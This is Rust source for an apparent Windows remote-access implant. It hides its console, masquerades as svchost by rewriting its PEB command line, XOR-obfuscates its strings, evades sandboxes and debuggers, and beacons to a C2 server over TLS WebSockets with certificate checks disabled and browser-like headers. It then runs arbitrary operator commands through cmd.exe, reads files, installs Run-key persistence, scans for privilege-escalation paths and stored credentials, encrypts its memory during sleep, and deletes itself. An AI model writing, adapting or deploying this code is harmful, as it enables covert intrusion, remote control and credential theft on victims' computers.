#![allow(clippy::needless_range_loop)]
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::env;

use std::net::TcpStream;
use std::sync::Arc;
use std::time::Duration;

const XOR_KEY: u8 = 0xAB;

const fn xor_encode<const N: usize>(input: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N { out[i] = input[i] ^ XOR_KEY; i += 1; }
    out
}

fn xor_decode(encoded: &[u8]) -> Vec<u8> {
    encoded.iter().map(|b| b ^ XOR_KEY).collect()
}

fn xd(encoded: &[u8]) -> String {
    String::from_utf8_lossy(&xor_decode(encoded)).to_string()
}

// C2
const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.0.107  ");
const ENC_C2_PORT: [u8; 4] = xor_encode(b"4443");
const ENC_WSS_PATH: [u8; 4] = xor_encode(b"/ws ");

// WS path rotation (blend with legitimate traffic)
const ENC_WS_PATH_0: [u8; 14] = xor_encode(b"/api/v2/events");
const ENC_WS_PATH_1: [u8; 37] = xor_encode(b"/socket.io/?EIO=4&transport=websocket");
const ENC_WS_PATH_2: [u8; 8] = xor_encode(b"/graphql");
const ENC_WS_PATH_3: [u8; 23] = xor_encode(b"/realtime/notifications");
const ENC_WS_PATH_4: [u8; 18] = xor_encode(b"/connect/websocket");

// Executables
const ENC_CMD_EXE: [u8; 7] = xor_encode(b"cmd.exe");

// Process masquerade
const ENC_MASQ_TITLE: [u8; 19] = xor_encode(b"Windows Update Host");
const ENC_MASQ_CMD: [u8; 45] = xor_encode(b"C:\\Windows\\System32\\svchost.exe -k netsvcs -p");

// Builtins
const ENC_BI_WHOAMI: [u8; 6] = xor_encode(b"whoami");
const ENC_BI_HOSTNAME: [u8; 8] = xor_encode(b"hostname");
const ENC_BI_DIR: [u8; 3] = xor_encode(b"dir");
const ENC_BI_TYPE: [u8; 4] = xor_encode(b"type");
const ENC_BI_TASKLIST: [u8; 8] = xor_encode(b"tasklist");
const ENC_BI_IPCONFIG: [u8; 8] = xor_encode(b"ipconfig");
const ENC_BI_NETSTAT: [u8; 7] = xor_encode(b"netstat");
const ENC_BI_SYSTEMINFO: [u8; 10] = xor_encode(b"systeminfo");
const ENC_BI_NET: [u8; 3] = xor_encode(b"net");
const ENC_BI_REG: [u8; 3] = xor_encode(b"reg");
const ENC_BI_CD: [u8; 2] = xor_encode(b"cd");
const ENC_BI_PWD: [u8; 3] = xor_encode(b"pwd");
const ENC_BI_ENV: [u8; 3] = xor_encode(b"set");
const ENC_BI_PS: [u8; 2] = xor_encode(b"ps");
const ENC_BI_KILL: [u8; 4] = xor_encode(b"kill");
const ENC_BI_PERSIST: [u8; 7] = xor_encode(b"persist");
const ENC_BI_SLEEP: [u8; 5] = xor_encode(b"sleep");
const ENC_BI_EXIT: [u8; 4] = xor_encode(b"exit");
const ENC_BI_SYSINFO: [u8; 4] = xor_encode(b"info");
const ENC_BI_PRIVESC: [u8; 2] = xor_encode(b"pe");

// Persistence
const ENC_REG_RUN: [u8; 52] = xor_encode(b"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run       ");
const ENC_PERSIST_NAME: [u8; 16] = xor_encode(b"WindowsUpdateSvc");

// User-Agent
const ENC_UA: [u8; 111] = xor_encode(b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");

// Sandbox detection strings (encoded)
const ENC_TASKLIST: [u8; 8] = xor_encode(b"tasklist");
const ENC_WMIC_BOOT: [u8; 27] = xor_encode(b"wmic os get lastbootuptime ");
const ENC_TASKLIST_CSV: [u8; 16] = xor_encode(b"tasklist /fo csv");
const ENC_WMIC_DISK: [u8; 21] = xor_encode(b"wmic diskdrive get si");
const ENC_WMIC_RAM: [u8; 37] = xor_encode(b"wmic computersystem get totalphysical");
const ENC_USERNAME: [u8; 8] = xor_encode(b"USERNAME");

// Analysis tools (encoded)
const ENC_T1: [u8; 9] = xor_encode(b"wireshark");
const ENC_T2: [u8; 7] = xor_encode(b"procmon");
const ENC_T3: [u8; 3] = xor_encode(b"ida");
const ENC_T4: [u8; 6] = xor_encode(b"x64dbg");
const ENC_T5: [u8; 7] = xor_encode(b"ollydbg");
const ENC_T6: [u8; 7] = xor_encode(b"fiddler");
const ENC_T7: [u8; 13] = xor_encode(b"processhacker");
const ENC_T8: [u8; 5] = xor_encode(b"dnspy");
const ENC_T9: [u8; 6] = xor_encode(b"ghidra");

// Sandbox usernames (encoded)
const ENC_SN1: [u8; 7] = xor_encode(b"sandbox");
const ENC_SN2: [u8; 7] = xor_encode(b"malware");
const ENC_SN3: [u8; 5] = xor_encode(b"virus");
const ENC_SN4: [u8; 6] = xor_encode(b"sample");
const ENC_SN5: [u8; 4] = xor_encode(b"test");
const ENC_SN6: [u8; 7] = xor_encode(b"analyst");

// Privesc scan strings (encoded)
const ENC_WHOAMI_PRIV: [u8; 12] = xor_encode(b"whoami /priv");
const ENC_SE_IMP: [u8; 13] = xor_encode(b"SeImpersonate");
const ENC_SE_DBG: [u8; 7] = xor_encode(b"SeDebug");
const ENC_SE_BAK: [u8; 8] = xor_encode(b"SeBackup");
const ENC_SE_RST: [u8; 9] = xor_encode(b"SeRestore");
const ENC_SE_TOW: [u8; 15] = xor_encode(b"SeTakeOwnership");
const ENC_SE_LDR: [u8; 12] = xor_encode(b"SeLoadDriver");
const ENC_SE_TCB: [u8; 5] = xor_encode(b"SeTcb");
const ENC_SE_ASN: [u8; 16] = xor_encode(b"SeAssignPrimary ");
const ENC_ENABLED: [u8; 7] = xor_encode(b"Enabled");
const ENC_WMIC_SVC: [u8; 42] = xor_encode(b"wmic service get name,pathname,startmode  ");
const ENC_PROG_FILES: [u8; 13] = xor_encode(b"Program Files");
const ENC_REG_AIE_LM: [u8; 85] = xor_encode(b"reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
const ENC_REG_AIE_CU: [u8; 85] = xor_encode(b"reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated");
const ENC_0X1: [u8; 3] = xor_encode(b"0x1");
const ENC_CMDKEY: [u8; 12] = xor_encode(b"cmdkey /list");
const ENC_TARGET: [u8; 7] = xor_encode(b"Target:");
const ENC_REG_DEFPW: [u8; 89] = xor_encode(b"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword");
const ENC_REG_SZ: [u8; 6] = xor_encode(b"REG_SZ");
const ENC_NET_SESS: [u8; 11] = xor_encode(b"net session");
const ENC_ACCESS_DEN: [u8; 16] = xor_encode(b"Access is denied");
const ENC_VER: [u8; 3] = xor_encode(b"ver");

// Builtin command strings (encoded to avoid plaintext leaks)
const ENC_TASKLIST_VCSV: [u8; 19] = xor_encode(b"tasklist /v /fo csv");
const ENC_TASKKILL_PFX: [u8; 14] = xor_encode(b"taskkill /PID ");
const ENC_FORCE_FLAG: [u8; 2] = xor_encode(b"/F");

// Persistence command fragments (encoded)
const ENC_REG_ADD_CMD: [u8; 7] = xor_encode(b"reg add");
const ENC_HKCU: [u8; 4] = xor_encode(b"HKCU");
const ENC_REG_SZ_FLAG: [u8; 10] = xor_encode(b"/t REG_SZ ");
const ENC_DATA_FLAG: [u8; 3] = xor_encode(b"/d ");
const ENC_FORCE: [u8; 2] = xor_encode(b"/f");

// Mutex name for single-instance check
const ENC_MUTEX: [u8; 30] = xor_encode(b"Global\\{e4a7c2d1-9f3b-4e8a-b6}");

const INITIAL_SLEEP_MS: u64 = 5000;
const MAX_SLEEP_MS: u64 = 300_000;
const JITTER_PCT: u64 = 30;
const WORK_HOUR_START: u32 = 7;
const WORK_HOUR_END: u32 = 23;

fn main() {
    #[cfg(target_os = "windows")]
    {
        unsafe {
            let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
            if hwnd != std::ptr::null_mut() {
                windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
            }
        }
    }

    masquerade();

    if detect_sandbox() {
        std::thread::sleep(Duration::from_secs(86400));
        return;
    }

    let mut sleep_ms = INITIAL_SLEEP_MS;
    let mut conn_count: u64 = 0;

    loop {
        #[cfg(target_os = "windows")]
        {
            if unsafe { windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() } != 0 {
                sleep_encrypted(60_000);
                continue;
            }
        }

        if !is_work_hours() {
            sleep_encrypted(60_000);
            continue;
        }

        match connect_and_run(conn_count) {
            Ok(_) => { sleep_ms = INITIAL_SLEEP_MS; }
            Err(_) => { sleep_ms = (sleep_ms * 2).min(MAX_SLEEP_MS); }
        }
        conn_count = conn_count.wrapping_add(1);

        let jitter = (sleep_ms * JITTER_PCT) / 100;
        let actual = sleep_ms + (rand::random::<u64>() % (jitter * 2 + 1)) - jitter;
        sleep_encrypted(actual);
    }
}

fn masquerade() {
    #[cfg(target_os = "windows")]
    unsafe {
        let title = xd(&ENC_MASQ_TITLE);
        let wide: Vec<u16> = title.encode_utf16().chain(std::iter::once(0)).collect();
        windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr());

        let peb: *mut MyPEB = get_peb();
        if !peb.is_null() {
            let params = (*peb).ProcessParameters;
            if !params.is_null() {
                let fake = xd(&ENC_MASQ_CMD);
                let wide: Vec<u16> = fake.encode_utf16().collect();
                let byte_len = (wide.len() * 2) as u16;
                let buf = (*params).CommandLine.Buffer;
                if !buf.is_null() {
                    let max = (*params).CommandLine.MaximumLength;
                    let copy = byte_len.min(max) as usize;
                    std::ptr::copy_nonoverlapping(wide.as_ptr(), buf, copy / 2);
                    (*params).CommandLine.Length = copy as u16;
                }
            }
        }
    }
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyPEB {
    _pad1: [u8; 32],
    ProcessParameters: *mut MyRTL_PARAMS,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyRTL_PARAMS {
    _pad: [u8; 112],
    CommandLine: MyUSTR,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct MyUSTR {
    Length: u16,
    MaximumLength: u16,
    _pad: u32,
    Buffer: *mut u16,
}

#[cfg(target_os = "windows")]
unsafe fn get_peb() -> *mut MyPEB {
    let peb: *mut MyPEB;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
    peb
}

fn detect_sandbox() -> bool {
    let mut score = 0u32;

    if let Ok(out) = rcmd(&xd(&ENC_TASKLIST)) {
        if out.lines().count() < 30 { score += 3; }
    }

    if let Ok(out) = rcmd(&xd(&ENC_WMIC_BOOT).trim()) {
        if out.lines().count() < 2 { score += 2; }
    }

    let tools: &[&[u8]] = &[&ENC_T1, &ENC_T2, &ENC_T3, &ENC_T4, &ENC_T5, &ENC_T6, &ENC_T7, &ENC_T8, &ENC_T9];
    if let Ok(procs) = rcmd(&xd(&ENC_TASKLIST_CSV)) {
        let pl = procs.to_lowercase();
        for t in tools {
            if pl.contains(&xd(t)) { score += 4; }
        }
    }

    if let Ok(out) = rcmd(&format!("{}ze", xd(&ENC_WMIC_DISK))) {
        for line in out.lines() {
            if let Ok(size) = line.trim().parse::<u64>() {
                if size < 40_000_000_000 { score += 2; }
            }
        }
    }

    if let Ok(out) = rcmd(&format!("{}memory", xd(&ENC_WMIC_RAM))) {
        for line in out.lines() {
            if let Ok(ram) = line.trim().parse::<u64>() {
                if ram < 2_000_000_000 { score += 2; }
            }
        }
    }

    if let Ok(user) = env::var(xd(&ENC_USERNAME)) {
        let ul = user.to_lowercase();
        let names: &[&[u8]] = &[&ENC_SN1, &ENC_SN2, &ENC_SN3, &ENC_SN4, &ENC_SN5, &ENC_SN6];
        for n in names {
            if ul == xd(n) { score += 3; }
        }
    }

    score >= 12
}

#[derive(Debug)]
struct NoVerify;

impl rustls::client::danger::ServerCertVerifier for NoVerify {
    fn verify_server_cert(
        &self, _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8], _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::aws_lc_rs::default_provider().signature_verification_algorithms.supported_schemes()
    }
}

fn pick_ws_path(conn: u64) -> String {
    let paths: &[&[u8]] = &[&ENC_WS_PATH_0, &ENC_WS_PATH_1, &ENC_WS_PATH_2, &ENC_WS_PATH_3, &ENC_WS_PATH_4];
    let idx = (conn as usize) % paths.len();
    xd(paths[idx]).trim().to_string()
}

fn build_tls_config() -> Arc<rustls::ClientConfig> {
    use rustls::crypto::aws_lc_rs::cipher_suite;
    let chrome_suites = vec![
        cipher_suite::TLS13_AES_128_GCM_SHA256,
        cipher_suite::TLS13_AES_256_GCM_SHA384,
        cipher_suite::TLS13_CHACHA20_POLY1305_SHA256,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
        cipher_suite::TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
        cipher_suite::TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
        cipher_suite::TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
        cipher_suite::TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
    ];
    let provider = rustls::crypto::CryptoProvider {
        cipher_suites: chrome_suites,
        ..rustls::crypto::aws_lc_rs::default_provider()
    };
    Arc::new(
        rustls::ClientConfig::builder_with_provider(Arc::new(provider))
            .with_safe_default_protocol_versions()
            .unwrap()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(NoVerify))
            .with_no_client_auth()
    )
}

fn connect_and_run(conn_count: u64) -> Result<(), Box<dyn std::error::Error>> {
    let host = xd(&ENC_C2_HOST).trim().to_string();
    let port = xd(&ENC_C2_PORT).trim().to_string();
    let path = pick_ws_path(conn_count);

    let addr = format!("{}:{}", host, port);
    let tcp = TcpStream::connect_timeout(&addr.parse()?, Duration::from_secs(10))?;
    tcp.set_nodelay(true)?;

    let tls_config = build_tls_config();

    let server_name = host.clone().try_into().map_err(|_| "invalid dns")?;
    let tls_conn = rustls::ClientConnection::new(tls_config, server_name)?;
    let tls_stream = rustls::StreamOwned::new(tls_conn, tcp);

    let accept_lang = match conn_count % 3 {
        0 => "en-US,en;q=0.9",
        1 => "en-GB,en;q=0.9,en-US;q=0.8",
        _ => "en-US,en;q=0.9,fr;q=0.8",
    };

    let ws_url = format!("wss://{}:{}{}", host, port, path);
    let request = tungstenite::http::Request::builder()
        .uri(&ws_url)
        .header("Host", &host)
        .header("User-Agent", xd(&ENC_UA).trim())
        .header("Origin", format!("https://{}", host))
        .header("Accept-Language", accept_lang)
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Cache-Control", "no-cache")
        .header("Pragma", "no-cache")
        .header("Sec-Fetch-Dest", "websocket")
        .header("Sec-Fetch-Mode", "websocket")
        .header("Sec-Fetch-Site", "same-origin")
        .header("Connection", "Upgrade")
        .header("Upgrade", "websocket")
        .header("Sec-WebSocket-Version", "13")
        .header("Sec-WebSocket-Key", tungstenite::handshake::client::generate_key())
        .body(())?;

    let (mut ws, _) = tungstenite::client::client(request, tls_stream)?;

    let info = gather_system_info();
    ws.send(tungstenite::Message::Text(info))?;

    loop {
        let msg = ws.read()?;
        match msg {
            tungstenite::Message::Text(cmd) => {
                let cmd = cmd.trim().to_string();
                if cmd.is_empty() { continue; }
                let response = handle_command(&cmd);
                ws.send(tungstenite::Message::Text(response))?;
            }
            tungstenite::Message::Close(_) => break,
            tungstenite::Message::Ping(d) => { ws.send(tungstenite::Message::Pong(d))?; }
            _ => {}
        }
    }

    Ok(())
}

fn handle_command(cmd: &str) -> String {
    let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
    let base = parts[0].to_lowercase();
    let args = parts.get(1).copied().unwrap_or("");

    if base == xd(&ENC_BI_WHOAMI).trim() && args.is_empty() { return builtin_whoami(); }
    if base == xd(&ENC_BI_HOSTNAME).trim() && args.is_empty() { return builtin_hostname(); }
    if base == xd(&ENC_BI_PWD).trim() || (base == xd(&ENC_BI_CD).trim() && args.is_empty()) {
        return env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_else(|_| "?".into());
    }
    if base == xd(&ENC_BI_CD).trim() && !args.is_empty() {
        return match env::set_current_dir(args) {
            Ok(_) => env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_else(|_| "ok".into()),
            Err(e) => format!("err: {}", e),
        };
    }
    if base == xd(&ENC_BI_ENV).trim() && args.is_empty() {
        return env::vars().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("\n");
    }
    if base == xd(&ENC_BI_DIR).trim() {
        return builtin_dir(if args.is_empty() { "." } else { args });
    }
    if base == xd(&ENC_BI_TYPE).trim() && !args.is_empty() {
        return builtin_type(args);
    }
    if base == xd(&ENC_BI_PS).trim() {
        return rcmd(&xd(&ENC_TASKLIST_VCSV)).unwrap_or_default();
    }
    if base == xd(&ENC_BI_KILL).trim() && !args.is_empty() {
        return rcmd(&format!("{}{} {}", xd(&ENC_TASKKILL_PFX), args, xd(&ENC_FORCE_FLAG))).unwrap_or_default();
    }
    if base == xd(&ENC_BI_SYSINFO).trim() { return gather_system_info(); }
    if base == xd(&ENC_BI_PERSIST).trim() { return install_persistence(); }
    if base == xd(&ENC_BI_SLEEP).trim() && !args.is_empty() {
        if let Ok(secs) = args.parse::<u64>() {
            sleep_encrypted(secs * 1000);
            return format!("slept {}s", secs);
        }
    }
    if base == xd(&ENC_BI_EXIT).trim() { self_delete(); std::process::exit(0); }
    if base == xd(&ENC_BI_PRIVESC).trim() { return privesc_scan(); }

    exec_command(cmd)
}

fn builtin_whoami() -> String {
    if let Ok(user) = env::var(xd(&ENC_USERNAME)) {
        if let Ok(domain) = env::var("USERDOMAIN") {
            return format!("{}\\{}", domain, user);
        }
        return user;
    }
    "?".into()
}

fn builtin_hostname() -> String {
    env::var("COMPUTERNAME").unwrap_or_else(|_| "?".into())
}

fn builtin_dir(path: &str) -> String {
    let mut out = String::new();
    match std::fs::read_dir(path) {
        Ok(entries) => {
            for entry in entries.flatten() {
                let meta = entry.metadata();
                let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                let name = entry.file_name().to_string_lossy().to_string();
                if is_dir {
                    out.push_str(&format!("  <DIR>          {}\n", name));
                } else {
                    out.push_str(&format!("  {:>14} {}\n", size, name));
                }
            }
        }
        Err(e) => out.push_str(&format!("err: {}", e)),
    }
    out
}

fn builtin_type(path: &str) -> String {
    match std::fs::read_to_string(path) {
        Ok(content) => {
            if content.len() > 65536 { content[..65536].to_string() }
            else { content }
        }
        Err(e) => format!("err: {}", e),
    }
}

fn gather_system_info() -> String {
    let mut info = Vec::new();
    info.push(format!("user={}", builtin_whoami()));
    info.push(format!("host={}", builtin_hostname()));
    info.push(format!("os={}", env::var("OS").unwrap_or_default()));
    info.push(format!("arch={}", env::var("PROCESSOR_ARCHITECTURE").unwrap_or_default()));
    info.push(format!("dir={}", env::current_dir().map(|p| p.to_string_lossy().to_string()).unwrap_or_default()));
    if let Ok(ver) = rcmd(&xd(&ENC_VER)) { info.push(format!("ver={}", ver.trim())); }
    info.push(format!("admin={}", if is_admin() { "yes" } else { "no" }));
    info.join("|")
}

fn exec_command(cmd: &str) -> String {
    let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
    c.args(&["/C", cmd]);
    #[cfg(target_os = "windows")]
    { use std::os::windows::process::CommandExt; c.creation_flags(0x08000000); }
    match c.output() {
        Ok(output) => {
            let mut result = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            if !stderr.is_empty() { result.push_str(&stderr); }
            if result.is_empty() { result = format!("(exit {})", output.status.code().unwrap_or(-1)); }
            result
        }
        Err(e) => format!("err: {}", e),
    }
}

fn install_persistence() -> String {
    let exe = match env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return "err".into(),
    };

    let appdata = env::var("APPDATA").unwrap_or_default();
    if appdata.is_empty() { return "err".into(); }

    let pn = xd(&ENC_PERSIST_NAME);
    let dest = format!("{}\\{}.exe", appdata, pn.trim());

    if let Err(e) = std::fs::copy(&exe, &dest) { return format!("err: {}", e); }

    let rp = xd(&ENC_REG_RUN);
    let cmd = format!("{} \"{}\\{}\" /v {} {}{}\"{}\" {}",
        xd(&ENC_REG_ADD_CMD), xd(&ENC_HKCU), rp.trim(), pn.trim(),
        xd(&ENC_REG_SZ_FLAG), xd(&ENC_DATA_FLAG), dest, xd(&ENC_FORCE));
    match rcmd(&cmd) {
        Ok(_) => format!("+{}", dest),
        Err(e) => format!("err: {}", e),
    }
}

fn privesc_scan() -> String {
    let mut r = String::with_capacity(4096);

    r.push_str("[1]\n");
    if let Ok(out) = rcmd(&xd(&ENC_WHOAMI_PRIV)) {
        let privs: &[&[u8]] = &[&ENC_SE_IMP, &ENC_SE_DBG, &ENC_SE_BAK, &ENC_SE_RST,
                                  &ENC_SE_TOW, &ENC_SE_LDR, &ENC_SE_TCB, &ENC_SE_ASN];
        let en = xd(&ENC_ENABLED);
        for line in out.lines() {
            for p in privs {
                let pn = xd(p);
                let pt = pn.trim();
                if line.contains(pt) && line.contains(&en) {
                    r.push_str(&format!(" +{}\n", pt));
                }
            }
        }
    }

    r.push_str("\n[2]\n");
    if let Ok(out) = rcmd(&xd(&ENC_WMIC_SVC).trim()) {
        let pf = xd(&ENC_PROG_FILES);
        for line in out.lines() {
            if line.contains(&pf) && !line.contains("\"") {
                r.push_str(&format!(" +{}\n", line.trim()));
            }
        }
    }

    r.push_str("\n[3]\n");
    let lm = rcmd(&xd(&ENC_REG_AIE_LM));
    let cu = rcmd(&xd(&ENC_REG_AIE_CU));
    let v1 = xd(&ENC_0X1);
    if let (Ok(l), Ok(c)) = (&lm, &cu) {
        if l.contains(&v1) && c.contains(&v1) { r.push_str(" +\n"); } else { r.push_str(" -\n"); }
    }

    r.push_str("\n[4]\n");
    if let Ok(out) = rcmd(&xd(&ENC_CMDKEY)) {
        let tgt = xd(&ENC_TARGET);
        if out.contains(&tgt) { r.push_str(" +\n"); }
    }

    r.push_str("\n[5]\n");
    if let Ok(out) = rcmd(&xd(&ENC_REG_DEFPW)) {
        let rsz = xd(&ENC_REG_SZ);
        if out.contains(&rsz) { r.push_str(" +\n"); } else { r.push_str(" -\n"); }
    }

    r
}

fn sleep_encrypted(ms: u64) {
    let key: [u8; 32] = rand::random();

    #[cfg(target_os = "windows")]
    let regions = get_writable_regions();

    #[cfg(target_os = "windows")]
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }

    std::thread::sleep(Duration::from_millis(ms));

    #[cfg(target_os = "windows")]
    for (start, len) in &regions {
        unsafe {
            let ptr = *start as *mut u8;
            let slice = std::slice::from_raw_parts_mut(ptr, *len);
            xor_region(slice, &key);
        }
    }
}

fn xor_region(data: &mut [u8], key: &[u8; 32]) {
    for (i, b) in data.iter_mut().enumerate() {
        *b ^= key[i % key.len()];
    }
}

#[cfg(target_os = "windows")]
fn get_writable_regions() -> Vec<(usize, usize)> {
    let mut regions = Vec::new();
    let mut addr: usize = 0x10000;
    let max_addr: usize = 0x7FFFFFFEFFFF;

    unsafe {
        let current_module = windows_sys::Win32::System::LibraryLoader::GetModuleHandleW(std::ptr::null());
        let module_base = current_module as usize;

        while addr < max_addr {
            let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION = std::mem::zeroed();
            let ret = windows_sys::Win32::System::Memory::VirtualQuery(
                addr as *const _,
                &mut mbi,
                std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
            );
            if ret == 0 { break; }

            let region_start = mbi.BaseAddress as usize;
            let region_size = mbi.RegionSize;

            // MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04
            if mbi.State == 0x1000 && mbi.Protect == 0x04 {
                // Skip our own code section and stack guard pages
                if region_start != module_base && region_size > 4096 && region_size < 64 * 1024 * 1024 {
                    regions.push((region_start, region_size));
                }
            }

            addr = region_start + region_size;
            if addr <= region_start { break; }
        }
    }
    regions
}

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

fn is_work_hours() -> bool {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or(Duration::from_secs(0))
        .as_secs();
    let hour = ((secs % 86400) / 3600) as u32;
    hour >= WORK_HOUR_START && hour < WORK_HOUR_END
}

fn self_delete() {
    if let Ok(exe) = env::current_exe() {
        let path = exe.clone();
        std::thread::spawn(move || {
            for _ in 0..10 {
                std::thread::sleep(Duration::from_secs(2));
                if std::fs::remove_file(&path).is_ok() {
                    break;
                }
            }
        });
    }
}


fn rcmd(cmd: &str) -> Result<String, std::io::Error> {
    let mut c = std::process::Command::new(xd(&ENC_CMD_EXE));
    c.args(&["/C", cmd]);
    #[cfg(target_os = "windows")]
    { use std::os::windows::process::CommandExt; c.creation_flags(0x08000000); }
    let output = c.output()?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

fn is_admin() -> bool {
    if let Ok(out) = rcmd(&xd(&ENC_NET_SESS)) {
        let ad = xd(&ENC_ACCESS_DEN);
        !out.contains(&ad)
    } else { false }
}
